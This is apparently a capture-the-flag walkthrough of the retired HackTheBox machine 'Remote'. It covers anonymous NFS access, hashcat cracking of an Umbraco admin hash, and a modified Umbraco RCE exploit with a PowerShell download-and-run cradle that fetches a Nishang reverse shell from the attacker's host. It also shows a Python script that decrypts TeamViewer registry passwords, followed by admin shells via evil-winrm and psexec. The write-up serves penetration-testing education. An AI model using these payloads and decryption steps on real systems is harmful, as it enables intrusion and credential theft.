---
title: HTB: Remote
url: https://0xdf.gitlab.io/2020/09/05/htb-remote.html
date: 2020-09-05T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: htb-remote, hackthebox, ctf, nmap, nfs, umbraco, hashcat, nishang, teamviewer, credentials, evilwinrm, oscp-like-v2, cpts-like
---

![Remote](https://0xdfimages.gitlab.io/img/remote-cover.png)

To own Remote, I’ll need to find a hash in a config file over NFS, crack the hash, and use it to exploit a Umbraco CMS system. From there, I’ll find TeamView Server running, and find where it stores credentials in the registry. After extracting the bytes, I’ll write a script to decrypt them providing the administrator user’s credentials, and a shell over WinRM or PSExec.

## Box Info

| Name | [Remote](https://hackthebox.com/machines/remote)  [Remote](https://hackthebox.com/machines/remote) [Play on HackTheBox](https://hackthebox.com/machines/remote) |
| --- | --- |
| Release Date | [21 Mar 2020](https://twitter.com/hackthebox_eu/status/1241000453376221186) |
| Retire Date | 05 Sep 2020 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Remote |
| Radar Graph | Radar chart for Remote |
| First Blood User | 00:57:49[enjloezz enjloezz](https://app.hackthebox.com/users/23792) |
| First Blood Root | 01:04:46[qtc qtc](https://app.hackthebox.com/users/103578) |
| Creator | [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## Recon

### nmap

`nmap` shows a bunch of open ports:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.180
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 15:01 EDT
Warning: 10.10.10.180 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.180
Host is up (0.016s latency).
Not shown: 65192 closed ports, 327 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds

root@kali# nmap -sV -sC -p 21,80,111,135,139,445,2049,5985,47001 -oA scans/nmap-tcpscripts 10.10.10.180
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 15:03 EDT
Nmap scan report for 10.10.10.180
Host is up (0.015s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m38s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-22T18:57:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.10 seconds

```

That’s a lot of Windows ports, as well as HTTP, FTP, and NSF.

### Website - TCP 80

#### Site

The website is for Acme Widgets:

[![image-20200322144140257](https://0xdfimages.gitlab.io/img/image-20200322144140257.png)](https://0xdfimages.gitlab.io/img/image-20200322144140257.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200322144140257.png)

There are many pages on the site, but none that are particularly interesting.

#### CMS

There are a few references to [Umbraco](https://umbraco.com/), a content management system (CMS). There’s a CSS link, a Javascript link, and text references near the blog posts:

![image-20200322145102836](https://0xdfimages.gitlab.io/img/image-20200322145102836.png)

Some quick Googling reveals that the admin login page is located at `/Umbraco`, which works here, presented a login prompt:

![image-20200322145218625](https://0xdfimages.gitlab.io/img/image-20200322145218625.png)

I tried some default creds, but didn’t make any progress.

#### Vulnerabilities

Some quick research found [this authenticated code execution vulnerability](https://www.exploit-db.com/exploits/46153) in Umbraco. If I find creds, I’ll come back to this.

### FTP - TCP 21

FTP is open and allows anonymous access. I connected, but the root is empty. I also tested writing, but was didn’t have permission.

### SMB - TCP 445

Typical checks on SMB showed no access to any shares:

```

root@kali# smbclient -N -L //10.10.10.180
session setup failed: NT_STATUS_ACCESS_DENIED

root@kali# smbmap -H 10.10.10.180
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.180
[!] Authentication error on 10.10.10.180

```

### NSF - TCP 2049

NFS is super uncommon on HTB machines, and thus, its being open is definitely worth some attention. `showmount` will give the paths that can be mounted and who can mount them. In this case, it’s named `site_backups` and everyone can access:

```

root@kali# showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)

```

I’ll mount this to `/mnt` on my host:

```

root@kali# mount -t nfs 10.10.10.180:/site_backups /mnt/

```

Now I have access to what looks like a backup of the web directory:

```

root@kali:/mnt# ls
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config    

```

Poking around a bit, there’s an `.sdf` file in `/App_Data` called `Umbraco.sdf`. `.sdf` files are standard database format files. I don’t know a great way to parse these files, but `strings` shows some interesting results right at the top of the file:

```

root@kali:/mnt/App_Data# strings Umbraco.sdf | head
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
@{pv
qpkaj

```

I can guess that there’s an admin account, with email admin@htb.local, and password hash `b8be16afba8c314ad33d812f22a04991b90e2aaa` that is a SHA1. There’s another user, smith, who has a password which is stored using HMACSHA256.

## Shell as IIS

### Access Umbraco Admin Panel

#### Crack Admin Hash

I dropped the admin SHA1 into a file, and ran `hashcat` to crack it:

```

root@kali# cat admin.sha1 
b8be16afba8c314ad33d812f22a04991b90e2aaa

root@kali# hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt --force                                                                                            hashcat (v5.1.0) starting...                                                                         
...[snip]...
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese                                              
                                                                                                     
Session..........: hashcat
Status...........: Cracked
Hash.Type........: SHA1
Hash.Target......: b8be16afba8c314ad33d812f22a04991b90e2aaa                                          
Time.Started.....: Sat Mar 21 20:00:46 2020 (4 secs)                                                 
Time.Estimated...: Sat Mar 21 20:00:50 2020 (0 secs)                                                 
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)                                           
Guess.Queue......: 1/1 (100.00%)                  
Speed.#1.........:  2573.2 kH/s (0.38ms) @ Accel:1024 Loops:1 Thr:1 Vec:8                            
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts                                        
Progress.........: 9824256/14344385 (68.49%)      
Rejected.........: 0/9824256 (0.00%)                                                                 
Restore.Point....: 9821184/14344385 (68.47%)                                                                                                                                                              
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1                            
Candidates.#1....: badco192 -> bacninh_kc         
                                                                                                     
Started: Sat Mar 21 20:00:34 2020            
Stopped: Sat Mar 21 20:00:51 2020  

```

It cracks to “baconandcheese”.

#### Login

The username admin doesn’t work, but the username “admin@htb.local” does.

![image-20200322151028207](https://0xdfimages.gitlab.io/img/image-20200322151028207.png)

### Exploit

Typically with a CMS I would look to upload a webshell. In this case, since I already have a potential RCE exploit, I’ll start there.

#### Customize Exploit

The exploit requires some customization to get it working, all of this goes in this section:

```

# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "XXXX";
password="XXXX";
host = "XXXX";

```

I’ll update the `login` to “admin@htb.local”, the `password` to “baconandcheese”, and the `host` to “http://10.10.10.180” (originally I just had the IP, but that leads to an error).

I’ll also need to update the `payload`. It currently launched calc. Obviously I want to change that. I’ll focus on this section (with some added whitespace):

```

{ string cmd = ""; 
 System.Diagnostics.Process proc = new System.Diagnostics.Process();
 proc.StartInfo.FileName = "calc.exe"; 
 proc.StartInfo.Arguments = cmd;
 proc.StartInfo.UseShellExecute = false; 
 proc.StartInfo.RedirectStandardOutput = true;
 proc.Start(); 
 string output = proc.StandardOutput.ReadToEnd(); 
 return output; }

```

I find with things like this that I have the most luck if I run `cmd.exe`. So I’ll change `proc.StartInfo.FileName = "calc.exe"` to `proc.StartInfo.FileName = "cmd.exe"`. Just after that, there’s `proc.StartInfo.Arguments = cmd;`. The variable `cmd` is set right at the beginning, currently to the empty string.

#### Ping POC

As a proof of concept, I’ll set `cmd = "/c ping 10.10.14.19"`. On running, it prints some messages:

```

root@kali# python umbraco_rce_ping.py 
Start
[]
End

```

Then there are pings in `tcpdump`:

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
16:53:30.589383 IP 10.10.10.180 > 10.10.14.19: ICMP echo request, id 1, seq 1, length 40
16:53:30.589462 IP 10.10.14.19 > 10.10.10.180: ICMP echo reply, id 1, seq 1, length 40
16:53:31.604147 IP 10.10.10.180 > 10.10.14.19: ICMP echo request, id 1, seq 2, length 40
16:53:31.604261 IP 10.10.14.19 > 10.10.10.180: ICMP echo reply, id 1, seq 2, length 40
16:53:32.619998 IP 10.10.10.180 > 10.10.14.19: ICMP echo request, id 1, seq 3, length 40
16:53:32.620023 IP 10.10.14.19 > 10.10.10.180: ICMP echo reply, id 1, seq 3, length 40
16:53:33.634646 IP 10.10.10.180 > 10.10.14.19: ICMP echo request, id 1, seq 4, length 40
16:53:33.634668 IP 10.10.14.19 > 10.10.10.180: ICMP echo reply, id 1, seq 4, length 40

```

#### Shell

I’ll update the payload with the PowerShell loader that will download from my host a [Nishang](https://github.com/samratashok/nishang) PowerShell reverse shell and run it. The payload will be:

```

string cmd = "/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.19/shell.ps1')";

```

To break that down, the target exe is still `cmd.exe`. It will run with `/c`, so running the command that follow. PowerShell will start, with `-c` to issue commands that follow. `iex` (shorthand for `Invoke-Expression`) will run whatever string comes back from the rest of the line. The rest of the line will reach out to my host, and download `shell.ps1` (which is then passed to `iex`).

I’ll grab a copy of `Invoke-PowerShellTcp.ps1` (and save it as `shell.ps1`), and add a line at the bottom to execute the shell:

```

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 443

```

Without this line, the harness would load the reverse shell functions into the PowerShell session, and but not use them. Now it will load the functions and then invoke the one I want to call back to me.

I’ll use three windows:
1. Run `python umbraco_rce_iex.py`.
2. A Python web server hosting `shell.ps1`.
3. A `nc` listener (with `rlwrap` for shell arrow keys) to catch the reverse shell.

Run the exploit (it hangs after `[]`):

```

root@kali# python umbraco_rce_iex.py 
Start
[]

```

In the web server, I see the GET for `shell.ps1`:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.180 - - [21/Mar/2020 20:33:14] "GET /shell.ps1 HTTP/1.1" 200 -

```

Then a second later the shell comes back:

```

root@kali# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.180.
Ncat: Connection from 10.10.10.180:49688.
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool

```

### user.txt

With this shell I can grab `user.txt`. I’m currently running as a user that doesn’t have a desktop, and in fact, there are no non-admin users on this machine:

```

PS C:\users> dir

    Directory: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/19/2020   3:12 PM                .NET v2.0
d-----        2/19/2020   3:12 PM                .NET v2.0 Classic
d-----        2/19/2020   3:12 PM                .NET v4.5
d-----        2/19/2020   3:12 PM                .NET v4.5 Classic
d-----        3/22/2020   4:53 PM                Administrator
d-----        2/19/2020   3:12 PM                Classic .NET AppPool
d-r---        2/20/2020   2:42 AM                Public 

```

However, in the `Public` folder, there’s the flag:

```

PS C:\users\Public> dir

    Directory: C:\users\Public

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        2/19/2020   3:03 PM                Documents
d-r---        9/15/2018   3:19 AM                Downloads
d-r---        9/15/2018   3:19 AM                Music
d-r---        9/15/2018   3:19 AM                Pictures
d-r---        9/15/2018   3:19 AM                Videos
-ar---        3/22/2020   4:54 PM             34 user.txt

PS C:\users\Public> type user.txt
96d361c9************************

```

## Priv: IIS –> administrator

### Enumeration

Looking at the `tasklist`, one application jumps out as particularly interesting:

```

PS C:\windows\system32\inetsrv>cd \ 
PS C:\> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0                            0          8 K
System                           4                            0        144 K
Registry                       104                            0     16,084 K
smss.exe                       300                            0      1,184 K
csrss.exe                      404                            0      5,464 K
wininit.exe                    484                            0      6,952 K
csrss.exe                      492                            1      4,752 K
winlogon.exe                   556                            1     14,416 K
services.exe                   632                            0      9,644 K
lsass.exe                      656                            0     14,028 K
...[snip]...
TeamViewer_Service.exe        3108                            0     18,392 K
...[snip]...

```

TeamViewer is a remote management software. Since this is the server, it will have credentials used for others to connect into it.

I can get the version by looking in the `\Program Files (x86)\TeamViewer`:

```

PS C:\Program Files (x86)\TeamViewer> ls

    Directory: C:\Program Files (x86)\TeamViewer

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/27/2020  10:35 AM                Version7 

```

There is a Metasploit module `post/windows/gather/credentials/teamviewer_passwords`. But since I like to avoid Meterpreter to see what’s going on under the hood, I’ll take a look at the [source](https://github.com/rapid7/metasploit-framework/blob/master//modules/post/windows/gather/credentials/teamviewer_passwords.rb). There’s a list of registry keys, and the one that looks like version 7 is `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7`. For each location, it looks for the following values:
- OptionsPasswordAES
- SecurityPasswordAES
- SecurityPasswordExported
- ServerPasswordAES
- ProxyPasswordAES
- LicenseKeyAES

I can take a look at that registry key:

```

PS C:\> cd HKLM:\software\wow6432node\teamviewer\version7
PS HKLM:\software\wow6432node\teamviewer\version7> get-itemproperty -path .

StartMenuGroup            : TeamViewer 7
InstallationDate          : 2020-02-20
InstallationDirectory     : C:\Program Files (x86)\TeamViewer\Version7
Always_Online             : 1
Security_ActivateDirectIn : 0
Version                   : 7.0.43148
ClientIC                  : 301094961
PK                        : {191, 173, 42, 237...}
SK                        : {248, 35, 152, 56...}
LastMACUsed               : {, 005056B99509}
MIDInitiativeGUID         : {514ed376-a4ee-4507-a28b-484604ed0ba0}
MIDVersion                : 1
ClientID                  : 1769137322
CUse                      : 1
LastUpdateCheck           : 1584564540
UsageEnvironmentBackup    : 1
SecurityPasswordAES       : {255, 155, 28, 115...}
MultiPwdMgmtIDs           : {admin}
MultiPwdMgmtPWDs          : {357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77}
Security_PasswordStrength : 3
PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer\vers
                            ion7
PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer
PSChildName               : version7
PSDrive                   : HKLM
PSProvider                : Microsoft.PowerShell.Core\Registry

```

`SecurityPasswordAES` is there from the list above. It just dumps a list of integers:

```

PS HKLM:\software\wow6432node\teamviewer\version7> (get-itemproperty -path .).SecurityPasswordAES
255
155
28
115
214
107
206
49
172
65
62
174
19
27
70
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91

```

### Decrypt Password

Looking a bit more at the Metasploit code, there’s a decrypt function:

```

def decrypt(encrypted_data)
    password = ""
    return password unless encrypted_data

    password = ""

    key = "\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    iv  = "\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
    aes = OpenSSL::Cipher.new("AES-128-CBC")
    begin
        aes.decrypt
        aes.key = key
        aes.iv = iv
        plaintext = aes.update(encrypted_data)
        password = Rex::Text.to_ascii(plaintext, 'utf-16le')
        if plaintext.empty?
            return nil
        end
    rescue OpenSSL::Cipher::CipherError => e
        print_error("Unable to decrypt the data. Exception: #{e}")
    end

```

It’s using AES128 in CBC mode with a static key and iv. I can easily recreate this in a few lines of Python:

```

#!/usr/bin/env python3

from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 
                    126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")

print(f"[+] Found password: {password}")

```

Running it finds a password:

```

root@kali# python3 decrypt_tvpass.py 
[+] Found password: !R3m0te!

```

### Shell

That password happens to work for the administrator account on Remote:

```

root@kali# crackmapexec smb 10.10.10.180 -u administrator -p '!R3m0te!'
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:REMOTE) (signing:False) (SMBv1:False)
SMB         10.10.10.180    445    REMOTE           [+] REMOTE\administrator:!R3m0te! (Pwn3d!)

```

The `(Pwn3d!)` shows this is an admin account, so I should be able to get a shell.

I can use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

root@kali# evil-winrm -u administrator -p '!R3m0te!' -i 10.10.10.180

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\desktop> whoami
remote\administrator

```

I could also use `psexec.py`:

```

root@kali# psexec.py 'administrator:!R3m0te!@10.10.10.180'
Impacket v0.9.21.dev1+20200313.160519.0056b61c - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.180.....
[*] Found writable share ADMIN$
[*] Uploading file ErcBEqYW.exe
[*] Opening SVCManager on 10.10.10.180.....
[*] Creating service amHC on 10.10.10.180.....
[*] Starting service amHC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```

Or `wmiexec.py`:

```

root@kali# wmiexec.py 'administrator:!R3m0te!@10.10.10.180'
Impacket v0.9.21.dev1+20200313.160519.0056b61c - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
remote\administrator

```

From any of these, I can grab the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
e2aeb068************************

```